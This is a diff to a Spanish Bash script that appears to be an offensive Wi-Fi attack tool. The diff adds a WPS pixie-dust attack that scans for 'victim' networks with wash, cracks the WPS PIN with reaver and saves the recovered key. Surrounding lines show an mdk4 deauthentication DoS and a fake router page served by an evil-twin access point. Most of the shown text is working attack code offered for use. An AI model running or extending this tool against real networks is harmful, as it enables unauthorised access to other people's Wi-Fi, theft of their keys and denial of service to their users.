@@ -17,6 +17,8 @@ tiempo_espera=20
 desaut=60
 # Estos son los segundos que estaremos haciendo el DoS con mdk4 si escogemos esta opcion.
 tiempo_mdk4=40
+# Comando de reaver. Bssid, canal e interface ya los toma el script.
+reaver=" -K -vv -Z"
 ############################################################################3
 ##################################
 CYAN=`echo -e "\033[01;36m"`
@@ -548,6 +550,7 @@ elif [ "$modelo" == "Askey" ];then
         echo -e '</italic-black>'
         echo -e '</body>'
         echo -e '</html>'" >${pwd}server/index.htm
+
 fi
 }
 function berate_confirmado() {
@@ -580,7 +583,7 @@ Tas pendejo?
 Bro, me estas vacilando, no?" >${pwd}torpe
 function validar_numero () {
 if [[ $1 -eq "0" ]] 2>/dev/null;then
-	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no sabes lo que es un cero?. Pulsa enter para probar otra vez${NORMAL}"
 	read
 	$2
 fi
@@ -998,7 +1001,7 @@ done
 if [ "$distro" != "si" ];then
         echo -n "${VERDE} Distro desconocida "
 fi
-echo
+echo "${NORMAL}"
 }
 function parseo () {
 clear
@@ -1065,6 +1068,9 @@ if [ $? = 0 ];then
 else
 	echo -e "${ROJO}[!!]${BLANCO} Algo salio mal. Saliendo..."
 fi
+if [ $pixie = si ];then
+wash
+fi
 airodump
 }
 function monitor () {
@@ -1113,6 +1119,7 @@ if [ ! -e oui.txt ] && [ "$openwrt" != "1" ];then
 		touch oui.txt
 	else
 		echo -e "${AMARILLO}[::]${BLANCO} Ok. Tu sabras.";echo
+		
 	fi
 fi
 if [ "$openwrt" != "1" ];then
@@ -1123,7 +1130,9 @@ if [ "$openwrt" != "1" ];then
 	service wpa_supplicant stop >/dev/null 2>&1
 fi
 eleccion_dispositivo
-echo -e "${AMARILLO}[::]${BLANCO} Para hacer el ataque en la banda de 5 GHz, necesitamos que el dispositivo que haga el DoS inyecte en la banda de 5 GHz"
+if [ $pixie != si ];then
+	echo -e "${AMARILLO}[::]${BLANCO} Para hacer el ataque en la banda de 5 GHz, necesitamos que el dispositivo que haga el DoS inyecte en la banda de 5 GHz"
+fi
 echo -e "${AMARILLO}[::]${BLANCO} Elige la banda en la que haremos el ataque:";echo
 echo -e "${AMARILLO}  1)${BLANCO}   Banda de 5 GHz."
 echo -e "${AMARILLO}  2)${BLANCO}   Banda de 2,4 GHz."
@@ -1152,6 +1161,9 @@ if [ $banda5 = si ];then
 	echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 5 GHz"
 else
 	echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 2,4 GHz"
+fi
+if [ $pixie = si ];then
+elegir_monitor_pixie
 fi
 echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que vamos a hacer es elegir un dispositivo para crear nuestro punto de acceso."
 echo -e "${AMARILLO}[::]${BLANCO} El punto de acceso siempre se hara sobre la banda de 2,4 GHz, por lo que no es necesario que el dispositivo trabaje en 5 GHz"
@@ -1234,7 +1246,148 @@ else
 	elegir_monitor
 fi
 }
+function elegir_monitor_pixie () {
+clear
+banner
+echo;echo -e "${AMARILLO}[::]${BLANCO} Necesitamos definir el dispositivo para hacer el ataque."
+echo -e "${AMARILLO}[::]${BLANCO} Recuerda que si estamos haciendo el ataque en la banda de 5 GHz, necesitamos que este dispotivo trabaje en la banda de 5GHz";echo
+eleccion_dispositivo
+echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo ";echo
+cuenta=1
+for i in `cat ${pwd}lista_interfaces`
+do
+        echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
+        cuenta=$((cuenta+1))
+done
+echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
+read opcion
+if [ -z $opcion ];then
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+        read
+        elegir_monitor_pixie
+fi
+validar_numero $opcion elegir_monitor_pixie
+cuenta=$((cuenta-1))
+if [ $opcion -le $cuenta ]; then
+        cuenta=$((cuenta+1))
+        cat ${pwd}lista_interfaces | sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
+        iface_dos=`cat ${pwd}iface_dos`
+        echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para auditar pixie-dust. Pulsa enter para continuar"
+        read
+        scan
+else
+        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+        read
+        elegir_monitor_pixie
+fi
+}
+function wash () {
+clear
+banner
+echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera escanear para buscar una victima."
+echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, termina el scan con ctrl+c y el script seguira su marcha"
+echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para iniciar la busqueda"
+read
+clear
+banner
+echo;echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, termina el scan con ctrl+c y el script seguira su marcha"
+echo;echo
+rm ${pwd}wash* 2>/dev/null
+wash=$(which wash)
+if [ $banda5 = si ]; then
+        $wash -O ${pwd}wash.cap -i $iface_dos -5 #2>/dev/null
+else
+        $wash -O ${pwd}wash.cap -i $iface_dos -2 
+fi
+$wash -f ${pwd}wash.cap > ${pwd}wash
+parseo_wash
+}
+function parseo_wash () {
+clear
+banner
+cuenta=1
+echo;echo -e "${AMARILLO}[::]${BLANCO} Redes encontradas:";echo
+grep  -v '^$' ${pwd}wash > ${pwd}wash_bk; rm ${pwd}wash; mv ${pwd}wash_bk ${pwd}wash
+while IFS= read -r linea ;do
+        if ! echo $linea | grep -q -E "BSSID|---"; then
+                echo "${VIOLETA}    ( $cuenta ) ${NORMAL}$linea "
+                ((cuenta++))
+        else 
+		echo "${NORMAL}          $linea"
+		if echo $liena | grep -q "\-\-\-"; then
+			echo
+		fi 
+        fi
+done < ${pwd}wash
+echo;echo -e "${AMARILLO}[??]${BLANCO} Elige una de ellas para iniciar el ataque pixie-dust. "
+echo -e "${AMARILLO}[??]${BLANCO} 0 o nada para volver a escanear."
+echo -ne "${AMARILLO}[??]${BLANCO} 00 para salir. Opcion: "
+read red
+if [ $red = "00" ];then
+salida && exit
+fi
+if [ -v $red ];then
+        wash
+else
+        validar_numero $red parseo_wash
+        cuenta=$((cuenta-1))
+        if [ $red -le $cuenta ]; then
+                conf_reaver $red 
+        else
+                echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL}. $red${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+                read
+                parseo_wash
+        fi
+fi
+}
+function conf_reaver () {
+(( red += 2 ))
+sed -n  "${red}p" ${pwd}wash > ${pwd}linea
+bssid=`cat ${pwd}linea | awk '{print $1}'` >/dev/null
+canal=`cat ${pwd}linea | awk '{print $2}'`  >/dev/null
+essid=`cat ${pwd}linea | awk '{print $NF}'`  >/dev/null
+reaver
+}
+function reaver () {
+clear
+banner
+echo;echo -e "${AMARILLO}[::]${NORMAL} COMIENZA EL ATAQUE PIXIE-DUST! "
+echo -e "${AMARILLO}[::]${NORMAL} Objetivo: ${VIOLETA} `cat ${pwd}linea`${NORMAL}"
+echo -e "${AMARILLO}[::]${NORMAL} CANCELA EL ATAQUE CON CTRL+C PARA VOLVER A ELEGIR RED "
+echo;echo
+reaver_bin=$(which reaver)
+if [ $banda5 = si ]; then
+	GH="-5"
+fi
+rm ${pwd}reaver_salida 2>/dev/null
+${reaver_bin}${reaver} -c $canal -b $bssid -i $iface_dos $GH | tee ${pwd}reaver_salida
+if [ $? = 0 ];then
+	if grep -q "Pin cracked" ${pwd}reaver_salida; then
+		cp ${pwd}reaver_salida ${essid}_wpa 2>/dev/null
+		echo;echo -e "${VERDE}  Enhorabuena!!! ${NORMAL}Se han guardado los resultados en el directorio de trabajo"
+	fi
+fi	
+echo;echo -ne "${AMARILLO}[::] ${NORMAL}Enter para volver al menu.";read
+parseo_wash
+}
+function abrir () {
+clear
+banner
+echo;echo -e "${CYAN} En la cabecera del sript puedes configurar algunas cosas. Quiza te venga bien."
+echo;echo -e "${AMARILLO}[::]${BLANCO} Elije la clase de ataque que quieres hacer:"
+echo;echo "     ${VIOLETA}( 1 )${NORMAL}   Awitas ataque evil twin"
+echo "     ${VIOLETA}( 2 )${NORMAL}   Ataque pixie-dust a WPS"
+echo;echo -ne "${AMARILLO}[??] ${NORMAL}Opcion: "
+read opcion
+if [ $opcion = 1 ];then
+	pixie=no
+elif [ $opcion = 2 ];then
+	pixie=si
+fi
+empezar
+}
 bandera=fax
+pixie=no
 systemctl stop lighttpd &>/dev/null
 systemctl disable lighttpd &>/dev/null
 if ! [ $(id -u) = 0 ]; then
@@ -1300,5 +1453,5 @@ if [ $? -eq 0 ];then
 	fi
 fi
 
-empezar
+abrir
 
